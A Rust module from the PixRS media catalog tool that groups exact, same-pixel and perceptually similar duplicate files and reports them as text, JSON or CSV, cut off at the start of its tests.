//! Find duplicates in the catalog, exact and visual, and report them.

/*************************************************************************************************
 * Copyright © 2022-2026 Kristian Thy (<thy@42.dk>)                                              *
 * This file is part of PixRS: <https://github.com/kthy/pixrs>                                   *
 *************************************************************************************************/

use crate::avhash::{
    audio_durations_match, audio_match, frames_match, has_detail, video_durations_match, Frame,
};
use crate::catalog::{
    extra_rows, library_path, AvSignature, Catalog, HashedAv, HashedFile, HashedImage,
};
use crate::dates::Taken;
use crate::imagehash::{distance, same_picture, Sizes, Visual};
use crate::library::LibraryId;
use crate::media::Dimensions;
use crate::text::shown;
use indicatif::HumanBytes;
use log::debug;
use serde::ser::{SerializeMap, SerializeStruct};
use serde::{Serialize, Serializer};
use std::cmp::Ordering;
use std::collections::HashMap;
use std::io::{self, Write};
use std::panic::resume_unwind;
use std::path::Path;
use std::thread::{self, available_parallelism};
use std::time::Instant;
use time::format_description::well_known::Rfc3339;
use time::macros::format_description;
use time::OffsetDateTime;

/// Hamming distance between perceptual hashes up to which images count as similar, unless
/// `--threshold` says otherwise. Every resized and recompressed copy in the calibration sample
/// (300 photos, six kinds of copy) was within 4 bits.
pub const DEFAULT_THRESHOLD: u32 = 6;

/// How closely files match. A group has the weakest match of any of its files to the kept one.
#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum Tier {
    /// The same bytes.
    Exact,
    /// The same decoded pixels, for example with different metadata.
    SamePixels,
    /// Close perceptual hashes, for example resized or recompressed.
    Similar,
}

impl Tier {
    /// The name used in reports.
    pub const fn as_str(self) -> &'static str {
        match self {
            Self::Exact => "exact",
            Self::SamePixels => "same-pixels",
            Self::Similar => "similar",
        }
    }
}

impl Serialize for Tier {
    fn serialize<S: Serializer>(&self, serializer: S) -> Result<S::Ok, S::Error> {
        serializer.serialize_str(self.as_str())
    }
}

/// A file in a duplicate group.
#[derive(Clone, Debug, PartialEq, Eq, Serialize)]
pub struct DupeFile {
    #[serde(skip)]
    pub library_id: LibraryId,
    /// Root of the library the file is in.
    pub library: String,
    /// Path relative to the library root, with `/` separators.
    pub path: String,
    /// Size in bytes.
    pub size: u64,
    /// Modification time in nanoseconds since the Unix epoch; reported as `mtime`, RFC 3339 in
    /// UTC.
    #[serde(rename = "mtime", serialize_with = "serialize_mtime")]
    pub mtime_ns: i64,
    /// Reported as the fields `keep` and `matches`.
    #[serde(flatten)]
    pub role: Role,
}

/// What a file in a group is to the group's kept file.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Role {
    /// The copy that would be kept.
    Keep,
    /// A copy of the kept file, matching it this closely.
    Copy(Tier),
}

impl Role {
    /// Whether this is the copy that would be kept.
    pub const fn is_keep(self) -> bool {
        matches!(self, Self::Keep)
    }

    /// How the file matches the kept one; none for the kept file itself.
    pub const fn matches(self) -> Option<Tier> {
        match self {
            Self::Keep => None,
            Self::Copy(tier) => Some(tier),
        }
    }
}

/// Reports show a role as two fields: `keep` (a bool) and `matches` (the tier, or null for the
/// kept file).
impl Serialize for Role {
    fn serialize<S: Serializer>(&self, serializer: S) -> Result<S::Ok, S::Error> {
        let mut fields = serializer.serialize_struct("Role", 2)?;
        fields.serialize_field("keep", &self.is_keep())?;
        fields.serialize_field("matches", &self.matches())?;
        fields.end()
    }
}

/// What the files of a group have in common.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum GroupKind {
    /// The same bytes, with this SHA-256.
    Exact { sha256: String },
    /// The same decoded pixels.
    SamePixels,
    /// Similar pictures or sound.
    Similar,
}

impl GroupKind {
    /// How closely the files match.
    pub const fn tier(&self) -> Tier {
        match self {
            Self::Exact { .. } => Tier::Exact,
            Self::SamePixels => Tier::SamePixels,
            Self::Similar => Tier::Similar,
        }
    }

    /// The SHA-256 the files share, for exact groups.
    pub fn sha256(&self) -> Option<&str> {
        match self {
            Self::Exact { sha256 } => Some(sha256),
            Self::SamePixels | Self::Similar => None,
        }
    }
}

/// Reports show a kind as the field `tier`, and `sha256` for exact groups.
impl Serialize for GroupKind {
    fn serialize<S: Serializer>(&self, serializer: S) -> Result<S::Ok, S::Error> {
        let mut fields = serializer.serialize_map(None)?;
        fields.serialize_entry("tier", &self.tier())?;
        if let Some(sha256) = self.sha256() {
            fields.serialize_entry("sha256", sha256)?;
        }
        fields.end()
    }
}

/// Files that are copies of each other.
#[derive(Clone, Debug, PartialEq, Eq, Serialize)]
pub struct DupeGroup {
    /// Reported as the fields `tier` and `sha256`.
    #[serde(flatten)]
    pub kind: GroupKind,
    /// The kept file first, then the others in the order the keeper was chosen by: oldest to
    /// newest, or for similar groups largest to smallest.
    pub files: Vec<DupeFile>,
}

impl DupeGroup {
    /// How closely the files match.
    pub const fn tier(&self) -> Tier {
        self.kind.tier()
    }

    /// Bytes freed by removing every copy but the kept one.
    pub fn reclaimable_bytes(&self) -> u64 {
        self.files.iter().skip(1).map(|f| f.size).sum()
    }
}

/// Totals for a report.
#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize)]
pub struct Summary {
    pub groups: usize,
    /// Files that are copies of a kept file.
    pub redundant_files: usize,
    pub reclaimable_bytes: u64,
    /// Files that share their size with another file but are not hashed yet, so they may be
    /// duplicates this report does not show.
    pub unhashed_candidates: usize,
    /// Images, videos and audio the hash pass has not decoded (new or changed since the last
    /// scan, or no tool for them), so they may have same-pixel or similar copies this report
    /// does not show. Files the decoder rejected, and images with too little detail for a
    /// perceptual hash, are not counted.
    pub unhashed_media: usize,
}

/// All duplicate groups: exact ones first, then same pixels, then similar, each largest
/// reclaimable size first.
#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize)]
pub struct DupeReport {
    pub groups: Vec<DupeGroup>,
    pub summary: Summary,
}

/// Most the aspect ratios (long side over short side) of two similar images may differ, as a
/// fraction. Resized copies keep their aspect ratio; crops and unrelated pictures often do not.
const MAX_ASPECT_DIFFERENCE: f64 = 0.03;

/// Videos shorter than this (in milliseconds) are only compared with `--similar`, like images:
/// Live Photo clips and other short clips shot moments apart look much like burst shots.
const SHORT_VIDEO_MS: i64 = 4000;

/// What `find_dupes` reads from the catalog. Loading it is quick; grouping it compares every
/// pair of images and can take a while, so the viewer does that without holding the catalog.
pub struct DupeInput {
    exact: Vec<HashedFile>,
    images: Vec<HashedImage>,
    /// Videos and audio with signatures.
    av: Vec<HashedAv>,
    unhashed_candidates: usize,
    unhashed_media: usize,
}

/// A file with whatever hashes it has, borrowed from the `DupeInput`.
struct Node<'a> {
    file: &'a HashedFile,
    pixel_hash: Option<&'a str>,
    visual: Option<&'a Visual>,
    dimensions: Option<Dimensions>,
    taken: Option<Taken>,
}

impl<'a> Node<'a> {
    const fn new(file: &'a HashedFile) -> Self {
        Self {
            file,
            pixel_hash: None,
            visual: None,
            dimensions: None,
            taken: None,
        }
    }

    /// Width times height, if known.
    fn pixels(&self) -> Option<u64> {
        self.dimensions.map(Dimensions::pixels)
    }
}

/// What a group has in common: exact if all its files have the same size and SHA-256, same
/// pixels if they all have the same pixel hash, otherwise similar.
fn group_kind(group: &[&Node]) -> GroupKind {
    let Some(first) = group.first() else {
        return GroupKind::Similar;
    };
    let all = |same: &dyn Fn(&Node) -> bool| group.iter().all(|n| same(n));
    if let Some(sha256) = &first.file.sha256 {
        if all(&|n| {
            n.file.stamp.size == first.file.stamp.size && n.file.sha256 == first.file.sha256
        }) {
            return GroupKind::Exact {
                sha256: sha256.clone(),
            };
        }
    }
    if first.pixel_hash.is_some() && all(&|n| n.pixel_hash == first.pixel_hash) {
        GroupKind::SamePixels
    } else {
        GroupKind::Similar
    }
}

/// How `file` matches `keeper`: the same bytes, the same pixels, or neither (it is in the group
/// because its perceptual hash is close to that of some file in it).
fn match_tier(keeper: &Node, file: &Node) -> Tier {
    if keeper.file.stamp.size == file.file.stamp.size
        && keeper.file.sha256.is_some()
        && keeper.file.sha256 == file.file.sha256
    {
        Tier::Exact
    } else if keeper.pixel_hash.is_some() && keeper.pixel_hash == file.pixel_hash {
        Tier::SamePixels
    } else {
        Tier::Similar
    }
}

/// Union-find over node indices.
struct Sets(Vec<usize>);

#[expect(
    clippy::indexing_slicing,
    reason = "every index is a node id below the length `new` was given, and parents are ids"
)]
impl Sets {
    /// `n` nodes, each in a set of its own.
    fn new(n: usize) -> Self {
        Self((0..n).collect())
    }

    fn find(&mut self, i: usize) -> usize {
        let mut root = i;
        while self.0[root] != root {
            root = self.0[root];
        }
        let mut i = i;
        while self.0[i] != root {
            (self.0[i], i) = (root, self.0[i]);
        }
        root
    }

    fn union(&mut self, a: usize, b: usize) {
        let (a, b) = (self.find(a), self.find(b));
        if a != b {
            self.0[a.max(b)] = a.min(b);
        }
    }
}

/// Whether two images or videos have aspect ratios (long side over short side) close enough
/// for resized copies. Unknown dimensions match anything.
pub fn aspects_match(a: Option<Dimensions>, b: Option<Dimensions>) -> bool {
    match (a.map(Dimensions::aspect), b.map(Dimensions::aspect)) {
        (Some(a), Some(b)) => (a - b).abs() <= MAX_ASPECT_DIFFERENCE * a.max(b),
        _ => true,
    }
}

/// Whether two images are the same size, either way round.
fn sizes(a: Option<Dimensions>, b: Option<Dimensions>) -> Sizes {
    match (a, b) {
        (Some(a), Some(b)) if a == b || a == b.transposed() => Sizes::Same,
        _ => Sizes::Different,
    }
}

/// Whether both photos say when they were taken and the times differ: burst shots, since copies
/// keep the time they were taken (or lose it). Times are to the second, so shots taken within
/// the same second are left to the fingerprints.
fn taken_apart(a: Option<Taken>, b: Option<Taken>) -> bool {
    a.zip(b).is_some_and(|(a, b)| a != b)
}

/// What similar images are compared by.
struct ImageKey<'a> {
    node: usize,
    phash: u64,
    dimensions: Option<Dimensions>,
    taken: Option<Taken>,
    fingerprint: &'a [u8],
}

/// What similar videos are compared by.
struct VideoKey<'a> {
    node: usize,
    duration_ms: i64,
    dimensions: Option<Dimensions>,
    frames: &'a [Frame],
}

/// What similar audio is compared by.
struct AudioKey<'a> {
    node: usize,
    duration_ms: i64,
    values: &'a [u32],
}

/// A video or audio file and its node.
struct AvItem<'a> {
    node: usize,
    av: &'a HashedAv,
}

/// The pairs `row(i)` returns for every `i` below `rows`, on all cores. Rows are dealt out
/// round-robin, which balances the work when row `i` compares `i` with the rows after it.
fn pairs_by_row(
    rows: usize,
    row: impl Fn(usize, &mut Vec<(usize, usize)>) + Sync,
) -> Vec<(usize, usize)> {
    let workers = available_parallelism().map_or(1, std::num::NonZero::get);
    let row = &row;
    thread::scope(|scope| {
        #[expect(
            clippy::needless_collect,
            reason = "every thread must start before any is joined"
        )]
        let handles: Vec<_> = (0..workers)
            .map(|w| {
                scope.spawn(move || {
                    let mut pairs = vec![];
                    for i in (w..rows).step_by(workers) {
                        row(i, &mut pairs);
                    }
                    pairs
                })
            })
            .collect();
        handles
            .into_iter()
            .flat_map(|h| h.join().unwrap_or_else(|panic| resume_unwind(panic)))
            .collect()
    })
}

/// `items[i]` and the items after it, if there is an `items[i]`.
fn this_and_rest<T>(items: &[T], i: usize) -> Option<(&T, &[T])> {
    items.get(i..)?.split_first()
}

impl<'a> ImageKey<'a> {
    /// What `image` is compared by, as node 0. `None` without a perceptual hash.
    fn of(image: &'a HashedImage) -> Option<Self> {
        image.visual.as_ref().map(|visual| ImageKey {
            node: 0,
            phash: visual.phash,
            dimensions: image.dimensions,
            taken: image.taken,
            fingerprint: &visual.fingerprint,
        })
    }

    /// Whether two images are similar: perceptual hashes at most `threshold` bits apart,
    /// matching aspect ratios, not taken at different times, and fingerprints of the same
    /// picture (`same_picture`).
    fn similar(&self, other: &Self, threshold: u32) -> bool {
        // Cheapest test first: most pairs fail on the hash.
        distance(self.phash, other.phash) <= threshold
            && aspects_match(self.dimensions, other.dimensions)
            && !taken_apart(self.taken, other.taken)
            && same_picture(
                self.fingerprint,
                other.fingerprint,
                sizes(self.dimensions, other.dimensions),
            )
    }
}

/// Whether two images are similar, by the test `dupes --similar` applies to every pair of
/// images. False for images without perceptual hashes.
pub fn images_similar(a: &HashedImage, b: &HashedImage, threshold: u32) -> bool {
    ImageKey::of(a)
        .zip(ImageKey::of(b))
        .is_some_and(|(a, b)| a.similar(&b, threshold))
}

/// Pairs of nodes of similar images (`ImageKey::similar`). Compares every pair, on all cores.
fn similar_images(images: &[ImageKey], threshold: u32) -> Vec<(usize, usize)> {
    pairs_by_row(images.len(), |i, pairs| {
        let Some((a, rest)) = this_and_rest(images, i) else {
            return;
        };
        for b in rest {
            if a.similar(b, threshold) {
                pairs.push((a.node, b.node));
            }
        }
    })
}

/// Pairs of nodes of similar videos (durations, aspect ratios and frames match) and similar
/// audio (durations and fingerprints match). Files are sorted by duration and only compared
/// within the duration tolerance, on all cores. Videos shorter than `SHORT_VIDEO_MS` are left
/// out unless `short_videos` is set, and so is audio without detail (silence, hum).
///
/// Audio is the costly part: an audio pair takes tens of microseconds, and music libraries have
/// many tracks of similar length.
fn similar_av(items: &[AvItem], threshold: u32, short_videos: bool) -> Vec<(usize, usize)> {
    let (mut videos, mut audio): (Vec<VideoKey>, Vec<AudioKey>) = (vec![], vec![]);
    for item in items {
        let duration_ms = item.av.signature.duration_ms();
        match &item.av.signature {
            AvSignature::Video(video) if short_videos || duration_ms >= SHORT_VIDEO_MS => {
                videos.push(VideoKey {
                    node: item.node,
                    duration_ms,
                    dimensions: item.av.dimensions,
                    frames: &video.frames,
                });
            }
            AvSignature::Audio(fingerprint) if has_detail(&fingerprint.values) => {
                audio.push(AudioKey {
                    node: item.node,
                    duration_ms,
                    values: &fingerprint.values,
                });
            }
            AvSignature::Video(_) | AvSignature::Audio(_) => {}
        }
    }
    videos.sort_by_key(|key| key.duration_ms);
    audio.sort_by_key(|key| key.duration_ms);
    let mut pairs = pairs_by_row(videos.len(), |n, pairs| {
        let Some((a, rest)) = this_and_rest(&videos, n) else {
            return;
        };
        for b in rest {
            if !video_durations_match(a.duration_ms, b.duration_ms) {
                break;
            }
            if aspects_match(a.dimensions, b.dimensions)
                && frames_match(a.frames, b.frames, threshold)
            {
                pairs.push((a.node, b.node));
            }
        }
    });
    pairs.extend(pairs_by_row(audio.len(), |n, pairs| {
        let Some((a, rest)) = this_and_rest(&audio, n) else {
            return;
        };
        for b in rest {
            if !audio_durations_match(a.duration_ms, b.duration_ms) {
                break;
            }
            if audio_match(a.values, b.values) {
                pairs.push((a.node, b.node));
            }
        }
    }));
    pairs
}

/// Read what `group_dupes` needs from the catalog. Image perceptual hashes and fingerprints
/// are only read when `similar_images` is set.
pub fn load_dupes(
    catalog: &Catalog,
    libraries: &[LibraryId],
    similar_images: bool,
) -> rusqlite::Result<DupeInput> {
    let mut input = DupeInput {
        exact: catalog.duplicate_candidates()?,
        images: catalog.hashed_images(similar_images)?,
        av: catalog.hashed_av()?,
        unhashed_candidates: catalog.count_unhashed_with_shared_size(libraries)?,
        unhashed_media: catalog.count_unhashed(libraries)?,
    };
    let files = input.exact.iter();
    let files = files.chain(input.images.iter().map(|image| &image.file));
    let files = files.chain(input.av.iter().map(|av| &av.file));
    let extra = extra_rows(files);
    if !extra.is_empty() {
        input.exact.retain(|file| !extra.contains(file));
        input.images.retain(|image| !extra.contains(&image.file));
        input.av.retain(|av| !extra.contains(&av.file));
    }
    debug!(
        "Loaded {} files that share size and SHA-256, {} decoded images, {} videos and audio",
        input.exact.len(),
        input.images.len(),
        input.av.len()
    );
    Ok(input)
}

/// Find duplicates. Files are linked when they have the same size and SHA-256 (exact), or the
/// same pixel hash (same pixels), and as similar: videos whose durations, shapes and frames
/// match, audio whose durations and fingerprints match, and with `similarity.images`, images
/// whose perceptual hashes are at most `similarity.threshold` bits apart, whose aspect ratios
/// match and whose fingerprints match. A group is every file linked to another, directly or
/// through others, and has the weakest tier among its files: a group with an exact pair and a
/// similar third file is similar.
///
/// Similar images are opt-in because on libraries with burst shots most similar pairs are
/// shots taken moments apart, not copies: on the owner's library, which has few resized copies,
/// the fingerprint check rejected about 95% of burst pairs, and those left still outnumbered
/// real copies.
///
/// With `libraries` empty, every group is reported. Otherwise only groups with at least one file
/// in the given libraries are, but still with all their files, so `pixrs dupes /old-disk` shows
/// what on the old disk also exists elsewhere.
///
/// In each group the kept file is the one with the earliest mtime. Ties are broken by path order:
/// library root first, then the path inside the library. In similar groups the largest file
/// (pixels, then bytes), or the oldest file with its bytes or pixels, is kept instead, since
/// similar copies are often scaled down; the oldest wins ties. The keeper is chosen from all
/// files, so it does not depend on `libraries`.
///
/// The report reflects the catalog as of each library's last scan; files are not checked.
pub fn find_dupes(
    catalog: &Catalog,
    libraries: &[LibraryId],
    similarity: Similarity,
) -> rusqlite::Result<DupeReport> {
    let input = load_dupes(catalog, libraries, similarity.images)?;
    Ok(group_dupes(&input, libraries, similarity))
}

/// How `find_dupes` looks for similar files.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub struct Similarity {
    /// Hamming distance between perceptual hashes (of images and video frames) up to which
    /// they count as similar.
    pub threshold: u32,
    /// Also look for similar images and short videos. Similar video and audio are otherwise
    /// always looked for: they have no burst-shot problem.
    pub images: bool,
}

impl Default for Similarity {
    fn default() -> Self {
        Self {
            threshold: DEFAULT_THRESHOLD,
            images: false,
        }
    }
}

impl Similarity {
    /// With similar images too.
    pub const fn with_images(threshold: u32) -> Self {
        Self {
            threshold,
            images: true,
        }
    }
}

/// One node per file in a `DupeInput`, whichever of its lists the file is in.
struct Graph<'a> {
    nodes: Vec<Node<'a>>,
    /// Nodes of files that share their size and SHA-256 with another file.
    exact: Vec<usize>,
    /// Videos and audio with signatures.
    av: Vec<AvItem<'a>>,
}

impl<'a> Graph<'a> {
    #[expect(
        clippy::indexing_slicing,
        reason = "`add` returns the index of the node it found or pushed"
    )]
    fn build(input: &'a DupeInput) -> Self {
        let mut nodes: Vec<Node<'a>> = vec![];
        let mut index: HashMap<(LibraryId, &'a str), usize> = HashMap::new();
        let mut add = |file: &'a HashedFile| -> usize {
            *index
                .entry((file.library_id, file.path.as_str()))
                .or_insert_with(|| {
                    nodes.push(Node::new(file));
                    nodes.len() - 1
                })
        };
        let exact: Vec<usize> = input.exact.iter().map(&mut add).collect();
        let images: Vec<(usize, &HashedImage)> = input
            .images
            .iter()
            .map(|image| (add(&image.file), image))
            .collect();
        let av: Vec<AvItem> = input
            .av
            .iter()
            .map(|av| AvItem {
                node: add(&av.file),
                av,
            })
            .collect();
        for (i, image) in images {
            let node = &mut nodes[i];
            node.pixel_hash = Some(&image.pixel_hash);
            node.visual = image.visual.as_ref();
            node.dimensions = image.dimensions;
            node.taken = image.taken;
        }
        // Videos and audio have dimensions for the keeper rule (largest first).
        for item in &av {
            nodes[item.node].dimensions = item.av.dimensions;
        }
        Self { nodes, exact, av }
    }

    /// Link files with the same size and SHA-256. Byte-identical files have the same pixels and
    /// size, even if only one was decoded: the others take its pixel hash and dimensions.
    /// Videos and audio have no pixel hash, but may have dimensions.
    #[expect(
        clippy::indexing_slicing,
        reason = "`self.exact` holds node indices from `build`"
    )]
    fn link_exact(&mut self, sets: &mut Sets) {
        let mut exact_sets: HashMap<(u64, Option<&str>), Vec<usize>> = HashMap::new();
        for &i in &self.exact {
            let file = self.nodes[i].file;
            exact_sets
                .entry((file.stamp.size, file.sha256.as_deref()))
                .or_default()
                .push(i);
        }
        let nodes = &mut self.nodes;
        for members in exact_sets.values() {
            let Some(&first) = members.first() else {
                continue;
            };
            let decoded = members
                .iter()
                .copied()
                .find(|&i| nodes[i].pixel_hash.is_some())
                .or_else(|| members.iter().copied().max_by_key(|&i| nodes[i].pixels()))
                .unwrap_or(first);
            let (pixel_hash, dimensions) = (nodes[decoded].pixel_hash, nodes[decoded].dimensions);
            for &i in members {
                sets.union(first, i);
                let node = &mut nodes[i];
                if node.pixel_hash.is_none() {
                    node.pixel_hash = pixel_hash;
                    node.dimensions = dimensions;
                }
            }
        }
    }

    /// Link files with the same pixel hash.
    fn link_pixels(&self, sets: &mut Sets) {
        let mut first_with_pixels: HashMap<&str, usize> = HashMap::new();
        for (i, node) in self.nodes.iter().enumerate() {
            if let Some(pixel_hash) = node.pixel_hash {
                sets.union(*first_with_pixels.entry(pixel_hash).or_insert(i), i);
            }
        }
    }

    /// Link similar images.
    fn link_similar_images(&self, sets: &mut Sets, threshold: u32) {
        let images: Vec<ImageKey> = self
            .nodes
            .iter()
            .enumerate()
            .filter_map(|(node, n)| {
                let visual = n.visual?;
                Some(ImageKey {
                    node,
                    phash: visual.phash,
                    dimensions: n.dimensions,
                    taken: n.taken,
                    fingerprint: &visual.fingerprint,
                })
            })
            .collect();
        let started = Instant::now();
        let pairs = similar_images(&images, threshold);
        debug!(
            "Compared {} images at threshold {}: {} similar {} in {:.1?}",
            images.len(),
            threshold,
            pairs.len(),
            plural(pairs.len(), "pair", "pairs"),
            started.elapsed()
        );
        for (a, b) in pairs {
            sets.union(a, b);
        }
    }

    /// Link similar videos and audio.
    fn link_similar_av(&self, sets: &mut Sets, similarity: Similarity) {
        let started = Instant::now();
        let pairs = similar_av(&self.av, similarity.threshold, similarity.images);
        debug!(
            "Compared {} videos and audio: {} similar {} in {:.1?}",
            self.av.len(),
            pairs.len(),
            plural(pairs.len(), "pair", "pairs"),
            started.elapsed()
        );
        for (a, b) in pairs {
            sets.union(a, b);
        }
    }

    /// The groups of linked files, with at least one file in `libraries` unless it is empty,
    /// sorted as `DupeReport` says.
    fn groups(&self, sets: &mut Sets, libraries: &[LibraryId]) -> Vec<DupeGroup> {
        let mut members: HashMap<usize, Vec<&Node>> = HashMap::new();
        for (i, node) in self.nodes.iter().enumerate() {
            members.entry(sets.find(i)).or_default().push(node);
        }
        let mut groups: Vec<DupeGroup> = members
            .into_values()
            .filter(|group| {
                group.len() > 1
                    && (libraries.is_empty()
                        || group.iter().any(|n| libraries.contains(&n.file.library_id)))
            })
            .filter_map(dupe_group)
            .collect();
        groups.sort_by(|a, b| {
            fn kept(g: &DupeGroup) -> Option<(&str, &str)> {
                g.files
                    .first()
                    .map(|f| (f.library.as_str(), f.path.as_str()))
            }
            a.tier()
                .cmp(&b.tier())
                .then_with(|| b.reclaimable_bytes().cmp(&a.reclaimable_bytes()))
                .then_with(|| kept(a).cmp(&kept(b)))
        });
        groups
    }
}

/// The order in which copies are kept: earliest mtime first, then path order (library root,
/// then the path inside the library).
pub fn oldest_first(a: &HashedFile, b: &HashedFile) -> Ordering {
    (a.stamp.mtime_ns, &a.root, &a.path).cmp(&(b.stamp.mtime_ns, &b.root, &b.path))
}

/// `oldest_first` for nodes.
fn oldest(a: &Node, b: &Node) -> Ordering {
    oldest_first(a.file, b.file)
}

/// The order in which files of a group are kept: oldest first, or in similar groups largest
/// first (pixels, then bytes), since similar copies are often smaller.
fn keeper_order(tier: Tier, a: &Node, b: &Node) -> Ordering {
    if tier == Tier::Similar {
        (b.pixels(), b.file.stamp.size)
            .cmp(&(a.pixels(), a.file.stamp.size))
            .then_with(|| oldest(a, b))
    } else {
        oldest(a, b)
    }
}

/// Of the largest file's exact and same-pixel copies, put the oldest first: a copy with
/// rewritten metadata can have more bytes than the original.
fn oldest_copy_of_largest_first(group: &mut [&Node]) {
    let Some((&largest, rest)) = group.split_first() else {
        return;
    };
    // The first of equally old copies, as `min_by` gives it; the largest file itself unless a
    // copy is older.
    let first = rest
        .iter()
        .enumerate()
        .filter(|(_, node)| match_tier(largest, node) != Tier::Similar)
        .min_by(|(_, a), (_, b)| oldest(a, b))
        .filter(|(_, copy)| oldest(copy, largest).is_lt())
        .map_or(0, |(p, _)| p + 1);
    if let Some(head) = group.get_mut(..=first) {
        head.rotate_right(1);
    }
}

/// The report's group for linked files, the kept one first.
fn dupe_group(mut group: Vec<&Node>) -> Option<DupeGroup> {
    let kind = group_kind(&group);
    let tier = kind.tier();
    group.sort_by(|a, b| keeper_order(tier, a, b));
    if tier == Tier::Similar {
        oldest_copy_of_largest_first(&mut group);
    }
    let (&keeper, copies) = group.split_first()?;
    let files = std::iter::once(dupe_file(keeper.file, Role::Keep))
        .chain(
            copies
                .iter()
                .map(|node| dupe_file(node.file, Role::Copy(match_tier(keeper, node)))),
        )
        .collect();
    Some(DupeGroup { kind, files })
}

/// A file as the report shows it.
fn dupe_file(file: &HashedFile, role: Role) -> DupeFile {
    DupeFile {
        library_id: file.library_id,
        library: file.root.to_string(),
        path: file.path.clone(),
        size: file.stamp.size,
        mtime_ns: file.stamp.mtime_ns,
        role,
    }
}

/// The grouping half of `find_dupes`, for input from `load_dupes`.
pub fn group_dupes(
    input: &DupeInput,
    libraries: &[LibraryId],
    similarity: Similarity,
) -> DupeReport {
    let mut graph = Graph::build(input);
    let mut sets = Sets::new(graph.nodes.len());
    graph.link_exact(&mut sets);
    graph.link_pixels(&mut sets);
    if similarity.images {
        graph.link_similar_images(&mut sets, similarity.threshold);
    }
    graph.link_similar_av(&mut sets, similarity);
    let groups = graph.groups(&mut sets, libraries);

    debug!(
        "{} {}: {} exact, {} same pixels, {} similar",
        groups.len(),
        plural(groups.len(), "group", "groups"),
        groups.iter().filter(|g| g.tier() == Tier::Exact).count(),
        groups
            .iter()
            .filter(|g| g.tier() == Tier::SamePixels)
            .count(),
        groups.iter().filter(|g| g.tier() == Tier::Similar).count()
    );
    let summary = Summary {
        groups: groups.len(),
        redundant_files: groups.iter().map(|g| g.files.len() - 1).sum(),
        reclaimable_bytes: groups.iter().map(DupeGroup::reclaimable_bytes).sum(),
        unhashed_candidates: input.unhashed_candidates,
        unhashed_media: input.unhashed_media,
    };
    DupeReport { groups, summary }
}

/// Serialize nanoseconds since the Unix epoch as `format_mtime` writes them.
#[expect(
    clippy::trivially_copy_pass_by_ref,
    reason = "serde's serialize_with passes fields by reference"
)]
fn serialize_mtime<S: Serializer>(mtime_ns: &i64, serializer: S) -> Result<S::Ok, S::Error> {
    serializer.serialize_str(&format_mtime(*mtime_ns))
}

/// Nanoseconds since the Unix epoch as RFC 3339 in UTC.
fn format_mtime(mtime_ns: i64) -> String {
    OffsetDateTime::from_unix_timestamp_nanos(i128::from(mtime_ns))
        .ok()
        .and_then(|dt| dt.format(&Rfc3339).ok())
        .unwrap_or_else(|| String::from("unknown"))
}

/// An mtime shortened to minutes for people: `2021-12-23 14:02 UTC`.
pub fn human_mtime(mtime_ns: i64) -> String {
    OffsetDateTime::from_unix_timestamp_nanos(i128::from(mtime_ns))
        .ok()
        .and_then(|dt| {
            dt.format(format_description!(
                "[year]-[month]-[day] [hour]:[minute] UTC"
            ))
            .ok()
        })
        .unwrap_or_else(|| String::from("unknown"))
}

/// Write the report for people to read.
pub fn write_text(report: &DupeReport, out: &mut impl Write) -> io::Result<()> {
    for group in &report.groups {
        let n = group.files.len();
        match &group.kind {
            GroupKind::Exact { sha256 } => writeln!(
                out,
                "{} copies of {} (sha256 {}):",
                n,
                HumanBytes(group.files.first().map_or(0, |f| f.size)),
                sha256.get(..12).unwrap_or(sha256)
            )?,
            GroupKind::SamePixels => writeln!(out, "{n} images with the same pixels:")?,
            GroupKind::Similar => writeln!(out, "{n} similar files:")?,
        }
        for file in &group.files {
            write!(
                out,
                "  {}  {}  {}",
                if file.role.is_keep() { "keep" } else { "    " },
                shown(&library_path(Path::new(&file.library), &file.path)),
                human_mtime(file.mtime_ns)
            )?;
            match (group.tier(), file.role) {
                (Tier::Exact, _) => writeln!(out)?,
                (_, Role::Copy(matches)) => {
                    writeln!(out, "  {}  {}", HumanBytes(file.size), matches.as_str())?;
                }
                (_, Role::Keep) => writeln!(out, "  {}", HumanBytes(file.size))?,
            }
        }
        writeln!(out)?;
    }
    let s = &report.summary;
    if s.groups == 0 {
        writeln!(out, "No duplicates found.")
    } else {
        writeln!(
            out,
            "{} {}, {} redundant {}, {} reclaimable.",
            s.groups,
            plural(s.groups, "group", "groups"),
            s.redundant_files,
            plural(s.redundant_files, "file", "files"),
            HumanBytes(s.reclaimable_bytes)
        )
    }
}

/// `one` if `n` is 1, else `many`.
pub const fn plural<'a>(n: usize, one: &'a str, many: &'a str) -> &'a str {
    if n == 1 {
        one
    } else {
        many
    }
}

/// Write the report as pretty-printed JSON.
pub fn write_json(report: &DupeReport, out: &mut impl Write) -> io::Result<()> {
    serde_json::to_writer_pretty(&mut *out, report)?;
    writeln!(out)
}

/// Write the report as CSV with a header row and one row per file. `sha256` is only set for
/// exact groups; `matches` is empty for the kept file.
pub fn write_csv(report: &DupeReport, out: &mut impl Write) -> io::Result<()> {
    writeln!(
        out,
        "group,tier,sha256,size,keep,matches,library,path,mtime"
    )?;
    for (i, group) in report.groups.iter().enumerate() {
        for file in &group.files {
            writeln!(
                out,
                "{},{},{},{},{},{},{},{},{}",
                i + 1,
                group.tier().as_str(),
                group.kind.sha256().unwrap_or(""),
                file.size,
                file.role.is_keep(),
                file.role.matches().map_or("", Tier::as_str),
                csv_field(&file.library),
                csv_field(&file.path),
                format_mtime(file.mtime_ns)
            )?;
        }
    }
    Ok(())
}

/// Quote a CSV field if it needs it (RFC 4180). A field that a spreadsheet would read as a
/// formula, one starting with `=`, `+`, `-`, `@`, a tab or a carriage return (file names can),
/// gets a leading `'`, which spreadsheets read as the start of text.
fn csv_field(value: &str) -> String {
    if value.starts_with(['=', '+', '-', '@', '\t', '\r']) {
        format!("\"'{}\"", value.replace('"', "\"\""))
    } else if value.contains([',', '"', '\n', '\r']) {
        format!("\"{}\"", value.replace('"', "\"\""))
    } else {
        String::from(value)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    use crate::avhash::{AudioFingerprint, VideoSignature};
    use crate::catalog::{AvSignature, FileRecord, MediaMeta, Stamp};
    use crate::imagehash::{ImageHashes, Visual};
    use crate::media::MediaType;
    use pretty_assertions::assert_eq;
    use tempfile::{tempdir, TempDir};

    /// Image hashes with a perceptual hash, if `phash` is given, and `fingerprint`.
    fn image_hashes(
        pixels: &str,
        phash: Option<u64>,
